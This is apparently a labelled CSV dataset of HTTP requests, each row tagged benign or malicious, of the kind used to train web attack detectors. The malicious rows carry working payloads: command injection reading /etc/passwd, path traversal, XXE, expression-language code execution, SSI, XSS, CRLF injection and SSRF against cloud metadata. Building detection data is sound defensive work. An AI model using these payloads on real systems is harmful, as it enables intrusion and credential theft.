label,text
benign,"GET /api/v2/settings/app-config-4239.xml HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
Accept: application/xml
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /system/trace_route?host=example.internal.net;%20cat%20/etc/passwd HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Cache-Control: max-age=0
Pragma: no-cache"
benign,"POST /api/v2/accounts/login HTTP/1.1
Host: login.secure-user-portal.net
Content-Type: application/json
Content-Length: 83
Content-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

{""username"":""janedoe89"",""password"":""5f4dcc3b5aa765d61d8327deb882cf99"",""rememberMe"":true}"
malicious,"GET /download?res=..%c0%af..%c0%af..%c0%afwp-config.php HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my-personal-blog-site.info/editor
Connection: keep-alive"
benign,"GET /media/user/avatars/updated HTTP/1.1
Host: secure-user-portal.net
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
X-Forwarded-For: 66.249.66.1
Connection: keep-alive"
benign,"GET /app/user/feed?sort=latest HTTP/1.1
Host: social-expressions.app
Cache-Control: no-cache
Pragma: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://social-expressions.app/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"POST /api/v1/inventory/check HTTP/1.1
Host: quickdelivery-services.co.uk
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.XuT55f.p9P4eI5XdKYhcCYMCjj1
Content-Type: application/json
Accept: application/json
Origin: https://quickdelivery-services.co.uk
X-Requested-With: FetchAPIClient
X-CSRF-Token: c0427e5baaaf4d9ebf5b
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36

{""itemCode"": ""DLVX-2229"", ""warehouse"": ""LHR1""}"
benign,"POST /account/picture/upload HTTP/1.1
Host: innovative-tech-summit.events
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--ITSFormBoundary101010
Cookie: session_id=otsksjfdlk3432jsdflk3423jsdf
Content-Length: 4173

----ITSFormBoundary101010
Content-Disposition: form-data; name=""album_id""

5678
----ITSFormBoundary101010
Content-Disposition: form-data; name=""caption""

Keynote speaker portrait
----ITSFormBoundary101010
Content-Disposition: form-data; name=""image_file""; filename=""speaker_photo.jpg""
Content-Type: image/jpeg

(simulated binary image data)
----ITSFormBoundary101010--"
benign,"POST /api/items/submit HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer rtyu98723ncv2345nmcbdfg45dfg
Content-Type: application/json
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Length: 128

{""item-info.name"": ""Epic Sword"",""item-info.level_required"": 15,""item-categories"": [""weapon"",""rare""],""metadata.owner-id"": ""user_132478"",""extra-tags"": ""event-limited,seasonal""}"
malicious,"GET /profile/view?user=user123%0d%0aSet-Cookie:%20lang=en-US; Expires=Wed, 09 Jun 2030 10:18:14 GMT HTTP/1.1
Host: social-connect.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Connection: close"
benign,"OPTIONS /v4/reports/generate HTTP/1.1
Host: reports.enterprise-analytics.cloud
Origin: https://analytics-tools-suite.io
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Connection: keep-alive"
malicious,"POST /api/v3/messages/send HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.10
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8
Content-Length: 256

{""recipient_id"":""189234"",""message"":""Your report is ready"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",""msg_type"":""alert""}"
benign,"PUT /api/data/item123 HTTP/1.1
Host: digital-museum-archive.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: text/plain
Content-Length: 28
Accept: */*
Via: 1.1 varnish
X-Forwarded-For: 203.0.113.45
Connection: close

Metadata updated for review"
benign,"GET /v4/events/upcoming HTTP/1.1
Host: event-centralized-app.com
Accept: application/json
X-Api-Token: 1ca564970abc235f9d8371e8412ce0ad
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip"
benign,"POST /checkout/payment HTTP/1.1
Host: express-shopping-cart.co.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Referer: https://express-shopping-cart.co.uk/cart/view
Cookie: shopSession=ed2387f8541b69e6d230b8f006ce8492
Connection: keep-alive

payment_method=credit_card&card_number=XXXXXXXXXXXX1111&expiration_date=12%2F26&cvv=123&csrf_token=f3a7ad21b7eb4d0eb9d5ad85dfdda849&form_id=paymentCheckout&timestamp=1686158001&return_url=%2Forder%2Fconfirmation"
benign,"DELETE /api/v1/library/books/5521 HTTP/1.1
Host: digital-library-services.org
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
If-Match: ""etag-book-5521-ab12""
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
DNT: 1
Connection: close"
benign,"GET /products/electronics/tv/details?id=47829 HTTP/1.1
Host: online-retail-store.biz:8081
Accept: application/json, text/plain, */*
Connection: keep-alive
DNT: 1
User-Agent: curl/7.88.1"
benign,"POST /log/submit HTTP/1.1
Host: online-retail-store.biz
Origin: https://www.online-retail-store.biz
Content-Type: text/plain
Content-Length: 57
DNT: 1
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15

event=user_search&query=wireless+headphones&results=23"
malicious,"GET /docs/api-reference HTTP/1.1
Host: devportal.tech-innovations.org
User-Agent: Mozilla/5.0 ""><script>eval(atob('YWxlcnQoJ1VTRVIgU0VSVklDRSEnKQ=='))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /blog/article/view/4589 HTTP/1.1
Host: my-personal-blog-site.info
Accept-Encoding: br, gzip, deflate
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: keep-alive"
malicious,"POST /api/v3/xml/submitOrder HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Content-Type: application/xml
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Length: 218

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE data [
  <!ELEMENT data ANY >
  <!ENTITY p SYSTEM ""file:///etc/passwd"" >
]>
<data>
  <userToken>&p;</userToken>
  <priority>high</priority>
</data>"
benign,"GET /v2/inventory/items/7f9c3b58 HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Authorization: Token 4f8e7b090fd31c2a56e012b967ed451b
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache"
benign,"GET /documents/creative-team/briefing_document_09-2023.pdf HTTP/1.1
Host: creativehub-agency.net
Referer: https://creativehub-agency.net/projects/summer_campaign
Accept: application/pdf
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6a Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /explore/photos?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: urban-photo-archive.io
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://urban-photo-archive.io/explore
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"GET /api/v3/utility/lookup/ip-10.0.0.5%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.68.0
Accept: */*
Connection: keep-alive"
benign,"GET /blog/posts?title=exploring+the+history+and+cultures+of+the+mediterranean+coastlines+and+their+influence+on+modern+seafood+cuisine HTTP/1.1
Host: coastal-tales.info
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"POST /api/v1/tasks/create HTTP/1.1
Host: productivity-suite.enterprise-apps.cloud
Content-Type: application/x-www-form-urlencoded
Content-Length: 228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Origin: https://productivity-suite.enterprise-apps.cloud
Connection: keep-alive

task_name=Quarterly+Budget+Review&details=%3Cdetails%3EReview+financial+projections+and+update+spreadsheet+accordingly.%3C%2Fdetails%3E&priority=high"
benign,"GET /api/v4/metrics?metric=cpu_usage&duration=3600&host=web-server-12 HTTP/1.1
Host: monitoring-dashboard-devops.net
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip
Via: 1.1 proxy123.edge
Connection: keep-alive"
benign,"POST /api/v1/orders/submit HTTP/1.1
Host: shopwise-ecommerce.biz
Content-Type: application/xml
Content-Length: 124
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/xml, text/xml
Connection: keep-alive

<order><customer>James Peterson</customer><item id=""A134"">Wireless Mouse</item><quantity>1</quantity></order>"
benign,"GET /dashboard/user/profile?cmd=view_details HTTP/1.1
Host: account-secure-portal.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://account-secure-portal.org/dashboard
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"POST /project/assets/upload HTTP/1.1
Host: creative-hub-app.ai
User-Agent: curl/7.79.1
Content-Type: multipart/form-data; boundary=----BoundaryXYZ98765
Content-Length: 530
Accept: */*
Connection: keep-alive
Origin: https://creative-hub-app.ai
Referer: https://creative-hub-app.ai/project/assets

------BoundaryXYZ98765
Content-Disposition: form-data; name=""image1""; filename=""logo.png""
Content-Type: image/png

<binary png data>
------BoundaryXYZ98765
Content-Disposition: form-data; name=""image2""; filename=""banner.jpg""
Content-Type: image/jpeg

<binary jpeg data>
------BoundaryXYZ98765--"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: tech-support-portal.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1
Content-Type: application/json-patch+json
Authorization: Bearer 4mrd73jqw4zpsohe3xnuf16t
Content-Length: 98
Accept-Language: en-US,en;q=0.5
Connection: keep-alive

[{ ""op"": ""replace"", ""path"": ""/profile/displayName"", ""value"": ""JennaD_Official"" }]"
benign,"POST /logout HTTP/1.1
Host: rental-apartments-europe.eu
Connection: keep-alive
Referer: https://rental-apartments-europe.eu/dashboard
Cookie: app_session=566415aa7f9c4d3d8c67d059c25b7d58; preferred_language=en-GB
User-Agent: curl/7.88.1
Content-Length: 0"
malicious,"PUT /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Sec-CH-UA: ""Chromium"";v=""88"", ""Google Chrome"";v=""88"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Android""
Origin: https://secure-user-portal.net
Content-Length: 172

{
  ""user_preferences"": {
    ""theme"": ""dark"",
    ""debug_info"": ""<!--#exec cmd=\""${P}a${T}H:0:1\""cat /etc/p\""asswd\"" -->""
  },
  ""session_token"": ""a7f9d34b5e6c4d8fb2a1c9e0""
}"
benign,"POST /profiles/upload/avatar HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9lZG9lQG1lbC5pbmZvIiwiZXhwIjoxNzAwNDEyMDAwfQ.djlq34Yr5ZWzXhw5kTcVgFXTvkkY-JQ-JIFQXkoh8GQ
X-CSRF-Token: b5d9acbfc3704a32bafa6b579f1b47ec
Content-Type: application/json
Accept: application/json
Origin: https://my-personal-blog-site.info
X-Requested-With: FetchAPIClient
Content-Length: 56

{""avatarUrl"":""https://cdn.my-personal-blog-site.info/images/avatar123.png"",""action"":""uploadAvatar""}"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: analytics-data-warehouse.co
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip
Access-Control-Request-Method: HEAD
Referer: https://analytics-data-warehouse.co/reports/overview"
benign,"GET /profiles/user/8942157 HTTP/1.1
Host: vintage-cars-fanclub.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Referer: https://vintage-cars-fanclub.org/forums/recent-posts
Cookie: session_token=54763ffdb6a191c98f233d8a0b6e2fa1; last_visit=1685561234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
benign,"OPTIONS /api/v2/items/2374 HTTP/1.1
Host: api.themeparkmanager.net
Origin: https://controlpanel.adventuretravel.guide
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"OPTIONS /v4/financial-data/summary HTTP/1.1
Host: market-insights-portal.biz
Origin: https://investor-relations-dashboard.ai
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization, If-None-Match
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.19 Safari/537.36
Accept: application/json
Connection: keep-alive"
malicious,"POST /api/custom_data/store HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 329
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
X-Requested-With: FetchAPIClient
Accept: application/json, text/html
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""userDataXSS"",
  ""profile"": {
    ""name"": ""Alexandra Fields"",
    ""memberSince"": ""2019-11-03""
  },
  ""device"": ""iPhone13,4"",
  ""sessionToken"": ""d0c6b572-f33d-4d2f-a116-7dc77c5e1b39""
}"
benign,"GET /members/profile?id=1024&lang=fr&view=full HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
Connection: keep-alive
Referer: https://my-personal-blog-site.info/home
Cache-Control: no-cache"
benign,"GET /forum/thread/view?id=1024&highlight=user123 HTTP/1.1
Host: tech-support-discussions.org
User-Agent: python-requests/2.28.1
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Forwarded-For: 198.51.100.23"
malicious,"POST /app/user/settings/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Connection: keep-alive

username=guest&action=view&comment=safe_comment&username=admin&action=delete&comment=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"GET /product/fashion/summer-collection-2024 HTTP/1.1
Host: stylevault-fashion.net
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-CA,en;q=0.8
Connection: keep-alive"
malicious,"GET /api/get_photo?imageUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: imageproc.storage-network.cloud
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Origin: https://app.storage-network.cloud"
malicious,"POST /users/profile/signature-check HTTP/1.1
Host: encrypted-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Referer: https://encrypted-user-portal.net/users/profile
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

username=visitor&action=view&comment=nice+articles&username=admin&action=remove&comment=%3Cscript%3Exss()%3C%2Fscript%3E"
